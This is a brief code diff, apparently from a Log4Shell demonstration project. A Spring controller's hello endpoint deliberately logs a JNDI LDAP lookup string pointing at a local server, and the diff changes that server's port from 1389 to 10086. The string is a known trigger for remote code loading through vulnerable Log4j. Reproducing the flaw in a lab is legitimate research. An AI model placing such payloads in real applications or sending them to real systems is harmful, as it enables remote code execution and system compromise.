@@ -15,7 +15,7 @@ public class UserController {
     @ResponseBody
     public String hello(){
         logger.info("hello ");
-        logger.error("${jndi:ldap://127.0.0.1:1389/a}");
+        logger.error("${jndi:ldap://127.0.0.1:10086/a}");
 
         return "hello";
     }
